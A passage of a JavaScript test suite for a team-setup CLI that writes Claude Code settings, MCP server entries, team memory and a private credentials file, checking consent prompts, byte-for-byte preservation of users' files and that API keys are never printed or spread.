  return { ...result, text: lines.join("\n"), asked: t.asked };
}

/** The member's ~/.claude.json: Claude Code's own state and another server. */
const CLAUDE_JSON = [
  "{",
  '  "numStartups": 12,',
  '  "projects": {',
  '    "/work/web": { "allowedTools": [] }',
  "  },",
  '  "mcpServers": {',
  '    "github": { "command": "npx", "args": ["-y", "@modelcontextprotocol/server-github"], "env": { "GITHUB_TOKEN": "${GITHUB_TOKEN}" } }',
  "  }",
  "}",
  "",
].join("\n");

/** `after` is `before` with one run of bytes inserted, which holds `holds`. */
function onlyInserted(before, after, holds) {
  let s = 0;
  while (s < before.length && before[s] === after[s]) s++;
  const added = after.length - before.length;
  assert.ok(added > 0, "something was added");
  assert.equal(after.slice(0, s) + after.slice(s + added), before, "every byte outside the one entry is the member's");
  assert.ok(after.slice(s, s + added).includes(holds), `the inserted text holds ${holds}`);
  return after.slice(s, s + added);
}

scenario("TSU-M-01", () =>
  withHome((home, network) =>
    withClaude("2.1.316", async (claudeCalls) => {
      await ownFiles(home);
      const { client } = fakeSetup();
      const before = await tree(home);

      const { code, text, asked } = await setupRun(client, home, { answers: ["n"] });
      assert.equal(code, 4, text);
      assert.deepEqual(asked, ["Set this up? [y/N] "], "asked once");
      assert.ok(text.includes(HOOK_CHECK), "the hook command, verbatim");
      assert.ok(text.includes("github: npx -y @modelcontextprotocol/server-github"), "the MCP server's command and args, verbatim");
      assert.ok(text.includes("docs: https://docs.example.com/mcp"), "the MCP server's URL, verbatim");
      assert.ok(text.includes("@~/.claude/systemdox/acme/CLAUDE.md"), "the import line");
      assert.ok(text.includes(`${PROJECT}: 2 files, synced into ${memoryDir(home)}`), "the memory folder and its file count");
      assert.ok(text.includes(`"systemdox-acme": `) && text.includes(HEADERS_HELPER), "the marketplace entry");
      assert.ok(text.includes(join(home, "checkout", ".claude", "settings.local.json")), "the file autoMemoryDirectory goes in");
      assert.match(text, /acme-setup, version 1/);
      assert.match(text, /^Nothing was changed\.$/m);
      assert.deepEqual(await tree(home), before, "no file on the computer changed");
      assert.deepEqual(await claudeCalls(), ["--version"], "claude was only asked its version");
      assert.deepEqual(network, []);
    })
  )
);

scenario("TSU-M-02", () =>
  withHome((home) =>
    withClaude("2.1.201", async () => {
      await ownFiles(home);
      const { client } = fakeSetup();
      const before = await tree(home);
      const { code, text, asked } = await setupRun(client, home, { answers: [] });
      assert.equal(code, 3, text);
      assert.match(text, /Claude Code 2\.1\.316 or later is needed/);
      assert.match(text, /this computer has 2\.1\.201/);
      assert.match(text, /^Update it with: claude update$/m);
      assert.deepEqual(asked, [], "nothing was asked");
      assert.deepEqual(await tree(home), before, "no file on the computer changed");
    })
  )
);

test("setup: Claude Code not found is exit 3 too, and a workspace with nothing published adds nothing", () =>
  withHome(async (home) => {
    await ownFiles(home);
    const { client } = fakeSetup();
    const before = await tree(home);
    const lines = [];
    const code = await runTeamSetup({
      client, apiKey: KEY_ACME, keySource: "prompt", out: (l) => lines.push(l), terminal: true, yes: false, overwrite: false,
      cwd: join(home, "checkout"), claudeVersion: async () => undefined,
    });
    assert.equal(code, 3, lines.join("\n"));
    assert.match(lines.join("\n"), /2\.1\.316 or later is needed for the team setup; it was not found on this computer/);
    assert.match(lines.join("\n"), /claude update/);

    const empty = { getOwnTeamSetup: async () => ({ workspace: "acme", minClaudeCodeVersion: "2.1.316", marketplaceUrl: MARKETPLACE("acme"), parts: {}, skills: [], memory: [] }) };
    const quiet = [];
    assert.equal(await runTeamSetup({ client: empty, apiKey: KEY_ACME, keySource: "prompt", out: (l) => quiet.push(l), terminal: true, yes: false, overwrite: false, claudeVersion: async () => { throw new Error("not asked"); } }), 0);
    assert.deepEqual(quiet, []);
    assert.deepEqual(await tree(home), before);

    const refused = { getOwnTeamSetup: async () => { throw apiError(403, "SYD-A001"); } };
    const said = [];
    assert.equal(await runTeamSetup({ client: refused, apiKey: KEY_ACME, keySource: "prompt", out: (l) => said.push(l), terminal: true, yes: false, overwrite: false }), 1);
    assert.match(said.join("\n"), /SYD-A001/);
  })
);

scenario("TSU-M-03", () =>
  withHome((home, network) =>
    withClaude("2.1.316", async (claudeCalls) => {
      await ownFiles(home);
      const { client, team } = fakeSetup();

      const { code, text } = await setupRun(client, home);
      assert.equal(code, 0, text);

      const settingsText = await readFile(join(home, ".claude", "settings.json"), "utf8");
      const settings = JSON.parse(settingsText);
      assert.deepEqual(settings.extraKnownMarketplaces["systemdox-acme"], {
        source: { source: "url", url: MARKETPLACE("acme"), headersHelper: HEADERS_HELPER },
      });
      onlyInserted(OWN_SETTINGS, settingsText, '"systemdox-acme"');
      assert.equal(settings.enabledPlugins, undefined, "setup never enables the plugin");

      const claudeMd = await readFile(join(home, ".claude", "CLAUDE.md"), "utf8");
      assert.equal(claudeMd, OWN_CLAUDE_MD + "<!-- systemdox:acme -->\n@~/.claude/systemdox/acme/CLAUDE.md\n<!-- /systemdox:acme -->\n");
      assert.equal(await readFile(join(home, ".claude", "systemdox", "acme", "CLAUDE.md"), "utf8"), INSTRUCTIONS_V1);

      const local = JSON.parse(await readFile(join(home, "checkout", ".claude", "settings.local.json"), "utf8"));
      assert.deepEqual(local, { autoMemoryDirectory: memoryDir(home) });
      assert.deepEqual(await texts(memoryDir(home)), TEAM_MEMORY, "the team memory is in the folder");
      assert.deepEqual(team.latest(), TEAM_MEMORY, "the first sync deleted nothing from the team");

      assert.match(text, /^Two steps are left:$/m);
      assert.match(text, /^1\. Open Claude Code once in any folder, then close it\.$/m);
      assert.match(text, /^2\. Run `claude plugin install acme-setup@systemdox-acme` in your own terminal and accept the command it shows\.$/m);
      assert.deepEqual(await claudeCalls(), ["--version"], "never `claude plugin marketplace add`");
      assert.deepEqual(network, []);
    })
  )
);

test("setup: on a set-up computer it asks nothing and writes nothing; step 2 alone once the marketplace is known, nothing once installed", () =>
  withHome((home) =>
    withClaude("2.1.316", async () => {
      await ownFiles(home);
      const { client } = fakeSetup();
      assert.equal((await setupRun(client, home)).code, 0);
      const before = await tree(home);

      await write(home, ".claude/plugins/known_marketplaces.json", JSON.stringify({ "systemdox-acme": { source: {} } }));
      const known = await setupRun(client, home, { answers: [] });
      assert.equal(known.code, 0, known.text);
      assert.match(known.text, /^One step is left:\n1\. Run `claude plugin install acme-setup@systemdox-acme`/m);
      assert.doesNotMatch(known.text, /Open Claude Code once/);

      await write(home, ".claude/plugins/installed_plugins.json", JSON.stringify({ version: 2, plugins: { "acme-setup@systemdox-acme": [{ scope: "user" }] } }));
      const yes = await setupRun(client, home, { answers: [], yes: true, isTerminal: false });
      assert.equal(yes.code, 0, yes.text);
      assert.doesNotMatch(yes.text, /step/);
      const after = await tree(home);
      for (const file of [".claude/settings.json", ".claude/CLAUDE.md", ".claude/systemdox/acme/CLAUDE.md", "checkout/.claude/settings.local.json"]) {
        assert.equal(after[file], before[file], `${file} was not written again`);
      }
    })
  )
);

scenario("TSU-M-04", () =>
  withHome((home) =>
    withClaude("2.1.316", async () => {
      await ownFiles(home);
      const { client, publishInstructions } = fakeSetup();
      assert.equal((await setupRun(client, home)).code, 0);
      const installed = join(home, ".claude", "systemdox", "acme", "CLAUDE.md");
      const edited = INSTRUCTIONS_V1 + "My own line.\n";
      await writeFile(installed, edited);
      publishInstructions(INSTRUCTIONS_V2);

      const stopped = await setupRun(client, home);
      assert.equal(stopped.code, 2, stopped.text);
      assert.ok(stopped.text.includes("+ Run the tests before a push."), "the update shows the instructions' line diff");
      assert.ok(stopped.text.includes(`${installed} was edited since setup installed it`), "it names the edited file");
      assert.equal(await readFile(installed, "utf8"), edited, "the member's text is kept");

      const replaced = await setupRun(client, home, { overwrite: true });
      assert.equal(replaced.code, 0, replaced.text);
      assert.equal(await readFile(installed, "utf8"), INSTRUCTIONS_V2, "the instructions are the new version");
      assert.deepEqual((await readState("acme")).instructions, { version: 2, sha256: sha(INSTRUCTIONS_V2) });
    })
  )
);

scenario("TSU-M-05", () =>
  withHome((home) =>
    withClaude("2.1.316", async () => {
      await ownFiles(home);
      const { client, publishHooks } = fakeSetup();
      assert.equal((await setupRun(client, home)).code, 0);
      publishHooks([HOOK_CHECK, HOOK_FORMAT]);
      const before = await tree(home);

      const { code, text, asked } = await setupRun(client, home, { answers: [], yes: true, isTerminal: false });
      assert.equal(code, 4, text);
      assert.deepEqual(asked, [], "nothing was asked");
      assert.match(text, /^Not set up: these need a person at a terminal \(run setup without --yes\):$/m);
      assert.match(text, /^- the hook commands of acme-setup:$/m, "the hooks are listed as needing a person");
      assert.ok(text.includes(`+ ${HOOK_FORMAT}`), "with the line that changed");
      assert.doesNotMatch(text, /- the marketplace|- the team instructions|- the import block|autoMemoryDirectory/, "what was accepted is not listed");
      assert.deepEqual(await tree(home), before, "nothing changed");
    })
  )
);

scenario("TSU-M-06", () =>
  withHome((home) =>
    withClaude("2.1.316", async (claudeCalls) => {
      await ownFiles(home);
      // Every AI tool's MCP config is offered: Claude Code's .mcp.json and
      // ~/.claude.json (the member's, with their own state), Cursor's and VS Code's.
      for (const dir of ["checkout/.cursor", "checkout/.vscode", ".cursor"]) await mkdir(join(home, dir), { recursive: true });
      await write(home, ".claude.json", CLAUDE_JSON);
      const { client } = fakeSetup();
      // setup as the member runs it: the MCP server step, then the team setup.
      const first = await mcpStep(client, home);
      assert.equal(first.code, 0, first.text);
      const configs = [".mcp.json", ".claude.json", "checkout/.mcp.json", "checkout/.cursor/mcp.json", "checkout/.vscode/mcp.json", ".cursor/mcp.json"]
        .filter((p) => existsSync(join(home, p)));
      assert.deepEqual(configs, [".claude.json", "checkout/.mcp.json", "checkout/.cursor/mcp.json", "checkout/.vscode/mcp.json", ".cursor/mcp.json"]);
      for (const p of configs) {
        const entry = JSON.parse(await readFile(join(home, p), "utf8")).mcpServers.systemdox;
        assert.deepEqual(entry, { command: "npx", args: ["@systemdox/mcp-server"] }, `${p}: the server entry, with no key`);
      }
      const { code, text: teamText } = await setupRun(client, home);
      assert.equal(code, 0, teamText);
      const text = first.text + "\n" + teamText;

      const holding = [];
      for (const path of Object.keys(await tree(home))) {
        if ((await readFile(join(home, ...path.split("/")), "utf8")).includes(KEY_ACME)) holding.push(path);
      }
      assert.deepEqual(holding, [".claude/systemdox/credentials.json"], "the key is in SystemDox's credentials file only");
      assert.deepEqual(JSON.parse(await readFile(credentialsPath(), "utf8")), { acme: { apiKey: KEY_ACME } });
      if (process.platform === "win32") {
        const { stdout } = await run("icacls", [credentialsPath()]);
        assert.ok(!/Everyone|BUILTIN\\Users|Authenticated Users|\(I\)/.test(stdout), stdout);
      } else {
        assert.equal((await stat(credentialsPath())).mode & 0o777, 0o600, "readable by the member alone");
      }
      assert.ok(!text.includes(KEY_ACME), "nor printed");
      assert.ok(!(await claudeCalls()).some((l) => l.includes(KEY_ACME)), "nor on a command line");
    })
  )
);

test("setup: a key an earlier setup wrote into an MCP config is removed from its entry, and every other byte of the file is the member's", () =>
  withHome(async (home) => {
    await mkdir(join(home, "checkout"), { recursive: true });
    const before = '{\n  "numStartups": 12,\n  "mcpServers": {\n    "github": { "command": "npx", "env": { "GITHUB_TOKEN": "${GITHUB_TOKEN}" } },\n    "systemdox": ';
    const oldEntry =
      '{\n      "command": "npx",\n      "args": ["@systemdox/mcp-server"],\n      "env": { "SYSTEMDOX_API_KEY": "' +
      KEY_ACME +
      '", "SYSTEMDOX_CACHE_TTL": "60" }\n    }';
    const after = ',\n    "zeta": { "command": "zeta" }\n  },\n  "tipsHistory": { "a": 1 }\n}\n';
    await write(home, ".claude.json", before + oldEntry + after);
    // The project config an earlier setup wrote whole, pointed at another API URL.
    const project = { mcpServers: { systemdox: { command: "npx", args: ["@systemdox/mcp-server"], env: { SYSTEMDOX_API_KEY: KEY_ACME, SYSTEMDOX_API_URL: "https://preprod.example.com/systemdox" } } } };
    await write(home, "checkout/.mcp.json", JSON.stringify(project, null, 2) + "\n");
    const { client } = fakeSetup();

    const r = await mcpStep(client, home);
    assert.equal(r.code, 0, r.text);
    for (const file of [join(home, ".claude.json"), join(home, "checkout", ".mcp.json")]) {
      assert.ok(r.text.includes(`The key now lives in ~/.claude/systemdox/credentials.json and was removed from ${file}.`), r.text);
    }
    const userConfig = await readFile(join(home, ".claude.json"), "utf8");
    assert.ok(userConfig.startsWith(before) && userConfig.endsWith(after), "every byte outside the systemdox entry is the member's");
    assert.deepEqual(JSON.parse(userConfig).mcpServers.systemdox, { command: "npx", args: ["@systemdox/mcp-server"], env: { SYSTEMDOX_CACHE_TTL: "60" } });
    assert.deepEqual(JSON.parse(await readFile(join(home, "checkout", ".mcp.json"), "utf8")).mcpServers.systemdox, {
      command: "npx",
      args: ["@systemdox/mcp-server"],
    });
    const holding = [];
    for (const path of Object.keys(await tree(home))) {
      if ((await readFile(join(home, ...path.split("/")), "utf8")).includes(KEY_ACME)) holding.push(path);
    }
    assert.deepEqual(holding, [".claude/systemdox/credentials.json"]);
    assert.ok(!r.text.includes(KEY_ACME), "the key is not printed");

    // Run again: nothing to write, nothing removed.
    const snapshot = await tree(home);
    const again = await mcpStep(client, home);
    assert.equal(again.code, 0, again.text);
    assert.ok(!again.text.includes("was removed"), again.text);
    assert.deepEqual(await tree(home), snapshot);
  })
);

test("setup: when SystemDox does not name the key's workspace, the key is stored under SYSTEMDOX_WORKSPACE or the one the member types", () =>
  withHome(async (home) => {
    await mkdir(join(home, "checkout"), { recursive: true });
    await writeCredentials("other", KEY_OTHER);
    const down = { getOwnTeamSetup: async () => { throw apiError(503, "SYD-X500"); } };

    const bad = await mcpStep(down, home, { answers: [KEY_ACME, "", "Not a workspace!"] });
    assert.equal(bad.code, 1, bad.text);
    assert.match(bad.text, /Nothing was changed/);
    assert.deepEqual(JSON.parse(await readFile(credentialsPath(), "utf8")), { other: { apiKey: KEY_OTHER } });
    assert.ok(!existsSync(join(home, "checkout", ".mcp.json")));

    const typed = await mcpStep(down, home, { answers: [KEY_ACME, "", "acme", "1"] });
    assert.equal(typed.code, 0, typed.text);
    assert.match(typed.asked[2], /workspace/);
    assert.deepEqual(JSON.parse(await readFile(credentialsPath(), "utf8")), { other: { apiKey: KEY_OTHER }, acme: { apiKey: KEY_ACME } });
    // Two workspaces' keys: the entry names which one this server uses.
    assert.deepEqual(JSON.parse(await readFile(join(home, "checkout", ".mcp.json"), "utf8")).mcpServers.systemdox, {
      command: "npx",
      args: ["@systemdox/mcp-server"],
      env: { SYSTEMDOX_WORKSPACE: "acme" },
    });

    const fromEnv = await mcpStep(down, home, { answers: [KEY_ACME, "", "1"], env: { SYSTEMDOX_WORKSPACE: "acme" } });
    assert.equal(fromEnv.code, 0, fromEnv.text);
    assert.equal(fromEnv.asked.length, 3, "not asked for the workspace");
  })
);

test("the local server takes its key from SYSTEMDOX_API_KEY, then from credentials.json; several workspaces need SYSTEMDOX_WORKSPACE", () =>
  withHome(async (home) => {
    await assert.rejects(loadLocalConfig({}), /No SystemDox key/);
    await writeCredentials("acme", KEY_ACME);
    const config = await loadLocalConfig({});
    assert.equal(config.apiKey, KEY_ACME, "the key setup stored, with none in the environment");
    assert.equal(config.apiUrl, API);
    assert.equal((await loadLocalConfig({ SYSTEMDOX_API_KEY: KEY_OTHER })).apiKey, KEY_OTHER, "the environment first: a key in today's MCP configs keeps working");

    await writeCredentials("other", KEY_OTHER);
    await assert.rejects(
      loadLocalConfig({}),
      (e) => /acme, other/.test(e.message) && /SYSTEMDOX_WORKSPACE/.test(e.message) && /SYSTEMDOX_API_KEY/.test(e.message)
    );
    assert.equal((await loadLocalConfig({ SYSTEMDOX_WORKSPACE: "other" })).apiKey, KEY_OTHER);
    await assert.rejects(loadLocalConfig({ SYSTEMDOX_WORKSPACE: "nope" }), /no key for nope/);

    // The server as an AI tool starts it: no key in its environment, two in
    // credentials.json. It picks neither, and says why in what it tells the
    // session (ADR-223: it used to exit, which no session ever saw).
    const env = { ...process.env, HOME: home, USERPROFILE: home };
    delete env.SYSTEMDOX_API_KEY;
    delete env.SYSTEMDOX_WORKSPACE;
    const server = spawn(process.execPath, [join(HERE, "..", "dist", "cli.js")], { env, stdio: ["pipe", "pipe", "pipe"] });
    try {
      const answer = await new Promise((resolve, reject) => {
        const timer = setTimeout(() => reject(new Error("no answer from the server")), 20_000);
        server.stdout.once("data", (d) => {
          clearTimeout(timer);
          resolve(JSON.parse(String(d).split("\n")[0]));
        });
        server.stdin.write(
          JSON.stringify({
            jsonrpc: "2.0",
            id: 1,
            method: "initialize",
            params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "t", version: "0" } },
          }) + "\n"
        );
      });
      assert.match(answer.result.instructions, /SYSTEMDOX_WORKSPACE/);
      assert.ok(!JSON.stringify(answer).includes(KEY_ACME) && !JSON.stringify(answer).includes(KEY_OTHER), "no key is told");
    } finally {
      server.kill();
    }
  })
);

test("setup: a key from credentials.json is not written again; several memories and no --project is a usage error without a person", () =>
  withHome((home) =>
    withClaude("2.1.316", async () => {
      await ownFiles(home);
      const { client } = fakeSetup();
      const two = {
        ...client,
        getOwnTeamSetup: async () => ({ ...(await client.getOwnTeamSetup()), memory: [{ project: "notes", fileCount: 1 }, { project: "web", fileCount: 3 }] }),
      };
      const before = await tree(home);
      const r = await setupRun(two, home, { answers: [], yes: true, isTerminal: false });
      assert.equal(r.code, 1, r.text);
      assert.match(r.text, /acme has 2 team memories \(notes, web\): name this checkout's with --project/);
      assert.deepEqual(await tree(home), before);

      const asked = await setupRun(two, home, { answers: ["web", "n"] });
      assert.equal(asked.code, 4, asked.text);
      assert.match(asked.asked[0], /Which team memory is this checkout's\? \(notes, web\)/);
      assert.ok(asked.text.includes(join(home, ".claude", "systemdox", "acme", "memory", "web")));

      const fromFile = await setupRun(client, home, { keySource: "credentials" });
      assert.equal(fromFile.code, 0, fromFile.text);
      assert.ok(!existsSync(credentialsPath()), "a key read from credentials.json is not written back");
    })
  )
);

test("setup: removes every unpacked plugin version but the two newest", () =>
  withHome((home) =>
    withClaude("2.1.316", async () => {
      await ownFiles(home);
      const { client } = fakeSetup();
      for (const v of [1, 2, 3, 4]) await write(pluginDir("acme", v), "plugin.json", "{}");
      await writeState("acme", { plugin: Object.fromEntries([1, 2, 3, 4].map((v) => [String(v), { sha256: sha(`plugin ${v}`), installedAt: "2026-11-01T12:00:00Z" }])) });
      assert.equal((await setupRun(client, home)).code, 0);
      assert.deepEqual((await readdir(join(home, ".claude", "systemdox", "acme", "plugin"))).sort(), ["3", "4"]);
      assert.deepEqual(Object.keys((await readState("acme")).plugin).sort(), ["3", "4"]);
    })
  )
);

test("setup's file edits: one member set or replaced, every other byte kept", () => {
  assert.equal(setJsonMember('{"a":1}', ["b", "c"], true), '{"a":1,"b":{"c":true}}');
  assert.equal(setJsonMember("{}\n", ["a"], 1), '{"a":1}\n');
  assert.equal(setJsonMember('{\n  "x": {}\n}\n', ["x", "a"], 1), '{\n  "x": {\n    "a": 1\n  }\n}\n');
  assert.equal(setJsonMember('{\r\n\t"a": {\r\n\t\t"x": 1\r\n\t}\r\n}\r\n', ["a", "y"], [2]), '{\r\n\t"a": {\r\n\t\t"x": 1,\r\n\t\t"y": [\r\n\t\t\t2\r\n\t\t]\r\n\t}\r\n}\r\n');
  assert.equal(setJsonMember('{\n  "a": "o\\"ld",\n  "b": 2\n}\n', ["a"], "new"), '{\n  "a": "new",\n  "b": 2\n}\n');
  assert.equal(setJsonMember('{\n  "a": 1\n}', ["a", "b"], 2), '{\n  "a": {\n    "b": 2\n  }\n}');
  assert.throws(() => setJsonMember("[]", ["a"], 1), /JSON object/);

  const block = "<!-- systemdox:acme -->\r\n@~/.claude/systemdox/acme/CLAUDE.md\r\n<!-- /systemdox:acme -->";
  const old = "top\r\n<!-- systemdox:acme -->\r\nold\r\n<!-- /systemdox:acme -->\r\nbottom\r\n";
  assert.equal(withImportBlock(old, "acme"), `top\r\n${block}\r\nbottom\r\n`);
  assert.equal(withImportBlock("no newline", "acme"), "no newline\n" + block.replaceAll("\r\n", "\n") + "\n");
  assert.equal(withImportBlock("<!-- systemdox:acme-two -->\n", "acme"), "<!-- systemdox:acme-two -->\n" + block.replaceAll("\r\n", "\n") + "\n");
});

test("setup's usage: the four options, and nothing else", () => {
  assert.deepEqual(parseSetupArgs(["--project", "notes", "--dir", "x", "--yes", "--overwrite"]), { project: "notes", dir: "x", yes: true, overwrite: true });
  assert.throws(() => parseSetupArgs(["--force"]), /Unexpected argument --force/);
  assert.throws(() => parseSetupArgs(["--project"]), /--project needs a value/);
  assert.throws(() => parseSetupArgs(["--project", "Bad Name"]), /not a project name/);
});

// The first sync (gate-2+3 amendment #1473, proposal item 23): with no base
// in state.json the merge's base is the empty manifest.
scenario("TSU-M-35", () =>
  withHome(async (home) => {
    const team = fakeTeam({ files: TEAM_MEMORY });
    team.commit({ ...TEAM_MEMORY, "b.md": mem("feedback", "B, from the team") });

    const { code, text } = await sync(team);
    assert.equal(code, 0, text);
    assert.deepEqual(await texts(memoryDir(home)), team.latest(), "the member has every file of the team's latest version");
    assert.equal(Object.keys(team.latest()).length, 3, "the team's latest version still has every file");
    assert.deepEqual(team.named("pushMemoryVersion"), [], "nothing to push");
    const state = await readState("acme");
    assert.equal(state.memory[PROJECT].version, 2, "the member's next sync is against that version");
    assert.deepEqual(state.memory[PROJECT].manifest, Object.fromEntries(Object.entries(team.latest()).map(([p, c]) => [p, sha(Buffer.from(c, "utf8"))])));
  })
);

test("the package never ships the shared examples", async () => {
  const pkg = JSON.parse(await readFile(join(HERE, "..", "package.json"), "utf8"));
  assert.deepEqual(pkg.files, ["dist", "README.md"]);
  assert.ok(!(await readdir(join(HERE, "..", "dist"))).includes("person-values.json"));
});

test("team-setup.feature: a record of a scenario proved by hand is held to its fields", async () => {
  const good = [
    "---", "scenario: TSU-M-30", "result: passed", "provedAt: 2026-11-02", "claudeCode: 2.1.316",
    "environment: preprod", "terminal: PowerShell 7", "---", "Updated Claude Code; the next session loaded version 3 unasked.", "",
  ].join("\n");
  checkEvidence("TSU-M-30", good);
  checkEvidence("TSU-M-30", good.replace(/\n/g, "\r\n"));
  assert.throws(() => checkEvidence("TSU-M-31", good), /scenario/);
  assert.throws(() => checkEvidence("TSU-M-30", good.replace("passed", "failed")), /result/);
  assert.throws(() => checkEvidence("TSU-M-30", good.replace("environment: preprod\n", "")), /environment/);
  assert.throws(() => checkEvidence("TSU-M-30", good.replace("2.1.316", "latest")), /claudeCode/);
  assert.throws(() => checkEvidence("TSU-M-30", good.slice(0, good.lastIndexOf("---\n") + 4)), /nothing/);
  assert.throws(() => checkEvidence("TSU-M-30", "scenario: TSU-M-30\n"), /header/);
  await assert.rejects(evidence("TSU-M-99")(), { code: "ENOENT" });
});

test("team-setup.feature: every scenario has one state tag and a unique id", () => {
  assert.ok(SCENARIOS.length > 0, "no TSU-M scenario found");
  const ids = SCENARIOS.map((s) => s.id);
  assert.equal(new Set(ids).size, ids.length, `an id is used twice: ${ids.join(", ")}`);
  for (const s of SCENARIOS) {
    const state = s.tags.filter((t) => t === "@proposed" || t === "@built");
    assert.equal(state.length, 1, `${s.id} needs exactly one of @proposed or @built, has ${s.tags.join(" ") || "none"}`);
  }
});

test("team-setup.feature: a @proposed scenario has no test yet, and a @built one has one", () => {
  for (const s of SCENARIOS) {
    if (s.tags.includes("@built")) assert.ok(bound.has(s.id), `${s.id} is @built but no test binds it`);
    if (s.tags.includes("@proposed")) assert.ok(!bound.has(s.id), `${s.id} has a test: flip it to @built`);
  }
});
